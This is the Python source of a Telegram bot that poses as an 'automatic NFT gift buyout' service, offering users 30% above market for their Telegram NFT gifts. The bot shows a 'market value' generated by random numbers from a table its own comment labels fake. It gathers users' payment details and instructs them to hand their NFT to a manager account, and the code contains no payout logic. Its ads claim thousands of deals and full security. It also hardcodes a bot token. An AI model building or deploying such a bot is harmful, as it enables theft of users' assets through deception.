import logging
import re
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)

# ==================== CONFIG ====================
BOT_TOKEN = "8729370914:AAFe5bDtSnGxuUbu-yUZ7dhNoRT-boOHkik"
ADMIN_ID = 174415647
MANAGER_USERNAME = "@hostelman"
SUPPORT_USERNAME = "@hostelman"

# ==================== STATES ====================
WAITING_NFT_LINK = 1
WAITING_PAYMENT_METHOD = 2
WAITING_REQUISITES = 3

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== TEXTS ====================

WELCOME_RU = (
    "🎁 *Добро пожаловать в Автоматическую Скупку NFT-подарков в Telegram!*\n\n"
    "Мы — профессиональный сервис по выкупу NFT-подарков выше рыночной стоимости.\n"
    "Наш бот автоматически оценивает ваш NFT по характеристикам: модель, фон, узор — "
    "и предлагает вам цену *на 30% выше рынка* 📈\n\n"
    "Тысячи успешных сделок. Быстрые выплаты. Полная безопасность.\n\n"
    "Выберите действие ниже 👇"
)

WELCOME_EN = (
    "🎁 *Welcome to the Automatic NFT Gift Buyout service in Telegram!*\n\n"
    "We are a professional service that purchases NFT gifts above market value.\n"
    "Our bot automatically evaluates your NFT by characteristics: model, background, pattern — "
    "and offers you a price *30% above the market* 📈\n\n"
    "Thousands of successful deals. Fast payouts. Full security.\n\n"
    "Choose an action below 👇"
)

HOW_IT_WORKS_RU = (
    "⚙️ *Как работает бот?*\n\n"
    "1️⃣ Вы отправляете ссылку на NFT-подарок (например: `https://t.me/nft/PlushPepe-2133`)\n\n"
    "2️⃣ Бот анализирует NFT: модель, фон, узор — и рассчитывает его рыночную стоимость\n\n"
    "3️⃣ Вы выбираете способ получения оплаты:\n"
    "   • CryptoBot\n   • TRC20\n   • Tonkeeper\n   • Карта (UA, RU, US, BY, KZ, UZ, TR, AZ)\n\n"
    "4️⃣ Бот предлагает вам сумму на *30% выше рынка*\n\n"
    "5️⃣ Если вы согласны — вы кидаете NFT менеджеру {manager}, он проверяет и переводит оплату\n\n"
    "✅ Сделка завершена!"
).format(manager=MANAGER_USERNAME)

HOW_IT_WORKS_EN = (
    "⚙️ *How does the bot work?*\n\n"
    "1️⃣ You send a link to the NFT gift (e.g.: `https://t.me/nft/PlushPepe-2133`)\n\n"
    "2️⃣ The bot analyzes the NFT: model, background, pattern — and calculates its market value\n\n"
    "3️⃣ You choose the payment method:\n"
    "   • CryptoBot\n   • TRC20\n   • Tonkeeper\n   • Card (UA, RU, US, BY, KZ, UZ, TR, AZ)\n\n"
    "4️⃣ The bot offers you a price *30% above market*\n\n"
    "5️⃣ If you agree — send the NFT to {manager}, they verify and send the payment\n\n"
    "✅ Deal complete!"
).format(manager=MANAGER_USERNAME)

HOW_DEAL_RU = (
    "🤝 *Как проводится сделка?*\n\n"
    "1. Вы присылаете ссылку на NFT-подарок\n"
    "2. Бот считает рыночную цену по параметрам: модель, фон, узор\n"
    "3. Вы выбираете способ оплаты\n"
    "4. Бот озвучивает свою сумму:\n\n"
    "_Пример:_ Я предлагаю вам за ваш NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
    "Если согласны — нажмите *Да*, если нет — *Нет*\n\n"
    f"5. При согласии — отправьте NFT менеджеру {MANAGER_USERNAME}\n"
    "6. Менеджер проверяет подарок и переводит оплату на ваши реквизиты\n\n"
    "⚡ Среднее время сделки: 5–15 минут"
)

HOW_DEAL_EN = (
    "🤝 *How is the deal conducted?*\n\n"
    "1. You send the NFT gift link\n"
    "2. The bot calculates market price by: model, background, pattern\n"
    "3. You choose a payment method\n"
    "4. The bot announces its offer:\n\n"
    "_Example:_ I offer you for your NFT `https://t.me/nft/PlushPepe-2133` — *$142 USDT*\n"
    "If you agree — press *Yes*, if not — *No*\n\n"
    f"5. If agreed — send the NFT to {MANAGER_USERNAME}\n"
    "6. The manager verifies the gift and transfers payment to your details\n\n"
    "⚡ Average deal time: 5–15 minutes"
)

SELL_ASK_LINK_RU = (
    "🔗 *Отправьте ссылку на ваш NFT-подарок*\n\n"
    "Формат: `https://t.me/nft/НазваниеНФТ-Номер`\n\n"
    "⚠️ Принимаются только NFT-подарки Telegram. Убедитесь что ссылка ведёт именно на NFT, а не на что-то другое."
)

SELL_ASK_LINK_EN = (
    "🔗 *Send the link to your NFT gift*\n\n"
    "Format: `https://t.me/nft/NFTName-Number`\n\n"
    "⚠️ Only Telegram NFT gifts are accepted. Make sure the link leads to an NFT, not something else."
)

PAYMENT_METHODS_RU = [
    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Карта Украина", "🇷🇺 Карта Россия", "🇺🇸 Карта США",
    "🇧🇾 Карта Беларусь", "🇰🇿 Карта Казахстан",
    "🇺🇿 Карта Узбекистан", "🇹🇷 Карта Турция", "🇦🇿 Карта Азербайджан"
]

PAYMENT_METHODS_EN = [
    "💎 CryptoBot", "🔷 TRC20 (USDT)", "💎 Tonkeeper (TON)",
    "🇺🇦 Card Ukraine", "🇷🇺 Card Russia", "🇺🇸 Card USA",
    "🇧🇾 Card Belarus", "🇰🇿 Card Kazakhstan",
    "🇺🇿 Card Uzbekistan", "🇹🇷 Card Turkey", "🇦🇿 Card Azerbaijan"
]

# NFT name → fake base price range
NFT_PRICES = {
    "pepe": (80, 200), "plush": (60, 180), "dragon": (150, 400),
    "cat": (50, 150), "bear": (70, 200), "dog": (60, 160),
    "duck": (40, 120), "heart": (100, 300), "star": (90, 250),
    "crystal": (200, 600), "diamond": (300, 800)
}

def estimate_price(nft_name: str) -> tuple:
    name_lower = nft_name.lower()
    for key, (lo, hi) in NFT_PRICES.items():
        if key in name_lower:
            base = random.randint(lo, hi)
            our_price = round(base * 1.30, 2)
            return base, our_price
    base = random.randint(50, 300)
    our_price = round(base * 1.30, 2)
    return base, our_price

def is_nft_link(text: str) -> bool:
    return bool(re.match(r'https?://t\.me/nft/[\w\-]+', text.strip()))

def get_lang(context: ContextTypes.DEFAULT_TYPE) -> str:
    return context.user_data.get("lang", "ru")

# ==================== KEYBOARDS ====================

def lang_keyboard():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
    ]])

def main_menu_keyboard(lang):
    if lang == "ru":
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Продать NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ Как проводится сделка?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Поддержка", callback_data="support")],
        ])
    else:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Sell NFT", callback_data="sell")],
            [InlineKeyboardButton("⚙️ How is the deal conducted?", callback_data="how_deal")],
            [InlineKeyboardButton("🆘 Support", callback_data="support")],
        ])

def payment_keyboard(lang):
    methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
    buttons = []
    for i, method in enumerate(methods):
        buttons.append([InlineKeyboardButton(method, callback_data=f"pay_{i}")])
    buttons.append([InlineKeyboardButton(
        "◀️ Назад" if lang == "ru" else "◀️ Back", callback_data="back_main"
    )])
    return InlineKeyboardMarkup(buttons)

def confirm_keyboard(lang):
    yes = "✅ Да, согласен" if lang == "ru" else "✅ Yes, I agree"
    no = "❌ Нет" if lang == "ru" else "❌ No"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(yes, callback_data="confirm_yes")],
        [InlineKeyboardButton(no, callback_data="confirm_no")],
    ])

def back_keyboard(lang):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("◀️ Главное меню" if lang == "ru" else "◀️ Main menu", callback_data="back_main")
    ]])

# ==================== ADMIN PANEL ====================

def admin_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🖼 Изменить баннер", callback_data="admin_banner")],
        [InlineKeyboardButton("💬 Все сделки", callback_data="admin_deals")],
        [InlineKeyboardButton("🚫 Заблокировать юзера", callback_data="admin_ban")],
    ])

# ==================== HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        "🌍 Выберите язык / Choose your language:",
        reply_markup=lang_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    lang = get_lang(context)

    # Language select
    if data == "lang_ru":
        context.user_data["lang"] = "ru"
        await query.edit_message_text(
            WELCOME_RU, parse_mode="Markdown",
            reply_markup=main_menu_keyboard("ru")
        )
        return

    if data == "lang_en":
        context.user_data["lang"] = "en"
        await query.edit_message_text(
            WELCOME_EN, parse_mode="Markdown",
            reply_markup=main_menu_keyboard("en")
        )
        return

    # Main menu
    if data == "back_main":
        text = WELCOME_RU if lang == "ru" else WELCOME_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu_keyboard(lang))
        context.user_data.pop("state", None)
        return

    if data == "how_deal":
        text = HOW_DEAL_RU if lang == "ru" else HOW_DEAL_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data == "support":
        text = (
            f"🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к менеджеру: {SUPPORT_USERNAME}\n\n"
            "Мы работаем 24/7 и ответим вам в течение нескольких минут!"
            if lang == "ru" else
            f"🆘 *Support*\n\nFor all questions, contact the manager: {SUPPORT_USERNAME}\n\n"
            "We work 24/7 and will reply within minutes!"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    if data == "sell":
        context.user_data["state"] = WAITING_NFT_LINK
        text = SELL_ASK_LINK_RU if lang == "ru" else SELL_ASK_LINK_EN
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Payment method selected
    if data.startswith("pay_"):
        idx = int(data.split("_")[1])
        methods = PAYMENT_METHODS_RU if lang == "ru" else PAYMENT_METHODS_EN
        method = methods[idx]
        context.user_data["payment"] = method
        context.user_data["state"] = WAITING_REQUISITES

        nft_link = context.user_data.get("nft_link", "https://t.me/nft/PlushPepe-2133")
        our_price = context.user_data.get("our_price", 0)

        text = (
            f"💳 *Способ оплаты:* {method}\n\n"
            f"📎 *Ваш NFT:* `{nft_link}`\n"
            f"💵 *Наша цена:* ${our_price} USDT\n\n"
            f"📝 Введите ваши реквизиты для получения оплаты:"
            if lang == "ru" else
            f"💳 *Payment method:* {method}\n\n"
            f"📎 *Your NFT:* `{nft_link}`\n"
            f"💵 *Our price:* ${our_price} USDT\n\n"
            f"📝 Enter your payment details:"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        return

    # Deal confirm/decline
    if data == "confirm_yes":
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        text = (
            f"✅ *Отлично! Сделка принята.*\n\n"
            f"Теперь вам нужно отправить ваш NFT менеджеру {MANAGER_USERNAME}\n\n"
            f"📎 NFT: `{nft_link}`\n"
            f"💵 Сумма выплаты: *${our_price} USDT*\n\n"
            f"После получения NFT менеджер переведёт вам оплату в течение 5–15 минут.\n\n"
            f"⚠️ Важно: передавайте NFT ТОЛЬКО через {MANAGER_USERNAME}. Мы не несём ответственности за сделки вне официального канала."
            if lang == "ru" else
            f"✅ *Great! Deal accepted.*\n\n"
            f"Now you need to send your NFT to the manager {MANAGER_USERNAME}\n\n"
            f"📎 NFT: `{nft_link}`\n"
            f"💵 Payout amount: *${our_price} USDT*\n\n"
            f"After receiving the NFT, the manager will transfer payment within 5–15 minutes.\n\n"
            f"⚠️ Important: transfer the NFT ONLY via {MANAGER_USERNAME}. We are not responsible for deals outside the official channel."
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        context.user_data["state"] = None

        # Notify admin
        user = query.from_user
        admin_text = (
            f"🔔 *Новая сделка!*\n"
            f"👤 Пользователь: @{user.username or user.id} ({user.id})\n"
            f"📎 NFT: {nft_link}\n"
            f"💵 Сумма: ${our_price}\n"
            f"💳 Метод: {context.user_data.get('payment', '—')}"
        )
        try:
            await context.bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
        except:
            pass
        return

    if data == "confirm_no":
        text = (
            "❌ Вы отказались от сделки. Если передумаете — мы всегда готовы!\n\n"
            "Возвращайтесь в главное меню 👇"
            if lang == "ru" else
            "❌ You declined the deal. If you change your mind — we're always ready!\n\n"
            "Return to the main menu 👇"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard(lang))
        context.user_data["state"] = None
        return

    # ==================== ADMIN PANEL ====================
    if data == "admin_stats":
        await query.edit_message_text(
            "📊 *Статистика бота*\n\n"
            "👥 Пользователей: —\n"
            "💰 Сделок: —\n"
            "📈 Объём выплат: —\n\n"
            "_Подключите базу данных для реальной статистики_",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_broadcast":
        await query.edit_message_text(
            "📢 Рассылка\n\nФункция рассылки: подключите базу данных и реализуйте хранение user_id для отправки.",
            reply_markup=admin_keyboard()
        )
        return

    if data == "admin_banner":
        await query.edit_message_text(
            "🖼 *Изменение баннера*\n\nОтправьте новое фото с подписью для баннера. "
            "(Функция требует реализации хранилища)",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_deals":
        await query.edit_message_text(
            "💬 *Все сделки*\n\nПодключите базу данных для просмотра истории сделок.",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

    if data == "admin_ban":
        await query.edit_message_text(
            "🚫 *Блокировка юзера*\n\nВведите команду `/ban USER_ID` для блокировки.",
            parse_mode="Markdown", reply_markup=admin_keyboard()
        )
        return

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    lang = get_lang(context)
    text = update.message.text.strip()

    # ===== NFT link waiting =====
    if state == WAITING_NFT_LINK:
        if not is_nft_link(text):
            err = (
                "⚠️ *Ошибка!* Это не похоже на ссылку NFT-подарка.\n\n"
                "Пожалуйста, отправьте корректную ссылку в формате:\n"
                "`https://t.me/nft/НазваниеНФТ-Номер`"
                if lang == "ru" else
                "⚠️ *Error!* This doesn't look like an NFT gift link.\n\n"
                "Please send a valid link in the format:\n"
                "`https://t.me/nft/NFTName-Number`"
            )
            await update.message.reply_text(err, parse_mode="Markdown")
            return

        context.user_data["nft_link"] = text
        nft_name = text.split("/nft/")[-1].split("-")[0]
        base_price, our_price = estimate_price(nft_name)
        context.user_data["base_price"] = base_price
        context.user_data["our_price"] = our_price
        context.user_data["state"] = WAITING_PAYMENT_METHOD

        msg = (
            f"🔍 *Анализ NFT завершён!*\n\n"
            f"📎 NFT: `{text}`\n"
            f"🏷 Рыночная стоимость: ~${base_price} USDT\n"
            f"💰 *Наше предложение: ${our_price} USDT (+30%)*\n\n"
            f"Выберите способ получения оплаты 👇"
            if lang == "ru" else
            f"🔍 *NFT Analysis complete!*\n\n"
            f"📎 NFT: `{text}`\n"
            f"🏷 Market value: ~${base_price} USDT\n"
            f"💰 *Our offer: ${our_price} USDT (+30%)*\n\n"
            f"Choose your payment method 👇"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=payment_keyboard(lang))
        return

    # ===== Requisites waiting =====
    if state == WAITING_REQUISITES:
        context.user_data["requisites"] = text
        nft_link = context.user_data.get("nft_link", "")
        our_price = context.user_data.get("our_price", 0)
        payment = context.user_data.get("payment", "")
        context.user_data["state"] = None

        msg = (
            f"✅ *Реквизиты приняты!*\n\n"
            f"📋 *Итог сделки:*\n"
            f"📎 NFT: `{nft_link}`\n"
            f"💳 Способ оплаты: {payment}\n"
            f"💵 Сумма: *${our_price} USDT*\n"
            f"📝 Реквизиты: `{text}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💬 *Я предлагаю вам за ваш NFT* `{nft_link}` сумму *${our_price} USDT*\n\n"
            f"Если согласны — нажмите *Да*, если нет — *Нет* 👇"
            if lang == "ru" else
            f"✅ *Details accepted!*\n\n"
            f"📋 *Deal summary:*\n"
            f"📎 NFT: `{nft_link}`\n"
            f"💳 Payment method: {payment}\n"
            f"💵 Amount: *${our_price} USDT*\n"
            f"📝 Details: `{text}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💬 *I offer you for your NFT* `{nft_link}` the sum of *${our_price} USDT*\n\n"
            f"If you agree — press *Yes*, if not — *No* 👇"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=confirm_keyboard(lang))
        return

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Доступ запрещён.")
        return

    banner_text = (
        "🛡 *ADMIN PANEL*\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 NFT Auto-Buyout Bot\n"
        "📊 Управление ботом\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Выберите действие:"
    )

    # Try to send with image (banner)
    banner_url = "https://i.imgur.com/NFT_placeholder.jpg"  # замените на свой баннер
    try:
        await update.message.reply_photo(
            photo=banner_url,
            caption=banner_text,
            parse_mode="Markdown",
            reply_markup=admin_keyboard()
        )
    except:
        await update.message.reply_text(banner_text, parse_mode="Markdown", reply_markup=admin_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("🤖 Bot started...")
    app.run_polling()

if __name__ == "__main__":
    main()
